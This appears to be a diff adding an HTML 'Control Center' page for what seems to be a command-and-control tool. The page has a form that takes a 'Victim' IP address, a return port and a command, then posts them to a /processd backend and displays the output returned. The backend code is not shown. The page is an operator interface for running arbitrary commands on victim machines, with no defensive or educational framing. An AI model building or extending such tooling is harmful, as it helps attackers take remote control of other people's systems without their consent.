@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Center</title>
+</head>
+<body>
+    <fieldset>
+        <legend>Processd (HTTP)</legend>
+        <form action="/processd" method="POST">
+            <p>Return port: <input type="text" name="return_port" id="proc_return_port" required pattern="\d+" value="443"></p>
+            <p>Victim: <input type="text" name="vic_ip" id="proc_vic_ip" required pattern="(\d{1,3}\.){3}\d{1,3}"></p>
+            <p>Command: <input type="text" name="command" id="proc_command" required></p>
+            <input type="submit" value="Run!">
+        </form>
+        <p>Output:</p>
+        <pre id="proc_output"></pre>
+    </fieldset>
+    <script>
+        const form = document.forms[0]
+        form.addEventListener("submit", function(e){
+            const return_port = form.elements.return_port.value;
+            const vic_ip = form.elements.vic_ip.value;
+            const command = form.elements.command.value;
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            fetch("/processd", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    return_port,
+                    vic_ip,
+                    command
+                })
+            }).then(res=>res.text()).then(data=>{
+                document.getElementById("proc_output").textContent = data;
+            });
+            return false;
+        });
+    </script>
+</body>
+</html>
